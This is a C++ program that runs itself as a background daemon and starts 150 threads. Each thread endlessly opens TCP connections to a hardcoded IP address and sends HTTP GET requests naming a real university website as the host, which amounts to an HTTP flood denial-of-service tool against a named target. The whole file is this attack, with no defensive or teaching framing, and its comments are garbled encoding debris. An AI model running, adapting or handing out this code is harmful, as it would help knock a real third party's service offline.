#include "stdlib.h"
#include "sys/types.h"
#include <sys/socket.h> 
#include "netinet/in.h"
#include "string.h"
#include "arpa/inet.h"
#include<unistd.h>
#include<pthread.h>
#include <iostream>
#include <cstdio>

#include <sys/stat.h>
#define MAXFILE 65535
using namespace std;
void send_and_recv(int sockfd, char* url, char* fun_type, char* accept_type, char* ip, int port, char* body, char* connection_type);
void* download(void* ptr);
//sockfd��ʾTCP���ӵ��׽��֣�url����������Ի��߾��Ե�ַ��fun_type���󷽷���accept_type������ �ͣ�ip,port����ķ������ĵ�ַ�Ͷ˿ڣ�file_loc�����ļ����λ�ã�body��������壬connection_type����ָ�� connection������

int main()
{
	pid_t pc, pid;
	pc = fork();
	if (pc < 0)
	{
		cout << ("error fork") << endl;
		exit(1);
	}
	else if (pc > 0)
	{
		sleep(5);
		exit(0);
	}
		
	
	pid = setsid(); //�ڶ���
	if (pid < 0)
		perror("setsid error");
	chdir("/"); //������
	umask(0); //���Ĳ�
	for (int i = 0; i < MAXFILE; i++) //���岽
		close(i);
	for (int i = 0; i < 150; i++)
	{
		int err;
		pthread_t ntid;
		err = pthread_create(&ntid, NULL, download, NULL);
		if (err) {
			cout << "create keepAlive failed";
		}
	}
	while (1) {
		sleep(1000);
	}
}
void* download(void* ptr)
{
	while (1)
	{
		int sockfd;
		struct sockaddr_in serv_socket;
		int port = 80;
		char ip[] = "211.84.144.7"; //ip��ַ������ͨ��gethostbyname����ȡ
		bzero(&serv_socket, sizeof(struct sockaddr_in));
		serv_socket.sin_family = AF_INET;
		serv_socket.sin_port = htons(port);
		inet_pton(AF_INET, ip, &serv_socket.sin_addr);
		sockfd = socket(AF_INET, SOCK_STREAM, 0);
		int flag = connect(sockfd, (struct sockaddr *)&serv_socket, sizeof(serv_socket)); //������HTTP��������TCP����
		if (flag < 0)
		{
			continue;
		}
		send_and_recv(sockfd, "www.nynu.edu.cn", "GET", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", ip, port, NULL, "Close"); //���ص����庯��
		close(sockfd);
	}
}


void send_and_recv(int sockfd, char* url, char* fun_type, char* accept_type, char* ip, int port, char* body, char* connection_type)
{
	char* request = (char *) malloc(4 * 1024 * sizeof(char));
	if (body)
		sprintf(request, "%s %s HTTP/1.1\r\nAccept: %s\r\nHost: %s:%d\r\nConnection: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %s\r\n\r\n%d", fun_type, url, accept_type, ip, port, connection_type, body, strlen(body));
	else
		sprintf(request,
			"%s / HTTP/1.1\r\nContent-Type:application/x-www-form-urlencoded\r\nHost:%s\r\nAccept: %s\r\nConnection: %s\r\n\r\n",
			fun_type,
			url,
			accept_type,
			connection_type);
//����������֯�����ͷ������ӡ���Ľ���������¿�ͷ��д

	int send = write(sockfd, request, strlen(request));
	//printf("%s", request);
	free(request);
	char* response = (char *) malloc(1024 * sizeof(char));
	int length;
	do
	{
		length = read(sockfd, response, 1024);
		char* loc = strstr(response, "\r\n\r\n"); //�ػ񷵻�ͷ������\r\n\r\nΪ��ʶ
		if (loc)
		{
			int loci = loc - response + 4;
			//write(1, response, loci) ;//�������Ӧͷ���ʹ�ӡ����Ļ
			//write(1, loc, length - loci);
		}
		else
		{
			//write(1, response, length);
		}
		if (!length)//ע�⣬��Ϊ֮ǰ���õ���close������Ҳ����˵һ������������ϣ���������˻�Ͽ����ӣ���read�����᷵��0���������� ���˳�ѭ����������õ���Keep-Alive����������ر�TCP���ӣ�Ҳ��˵���򽫻ᱻ������read�����У����Ҫע������Լ��ж��Ƿ��������Ӧ �Ľ�β��Ȼ�����ٴε���read֮ǰ�˳�ѭ����
			break ;
	} while (1) ;
	free(response);
}

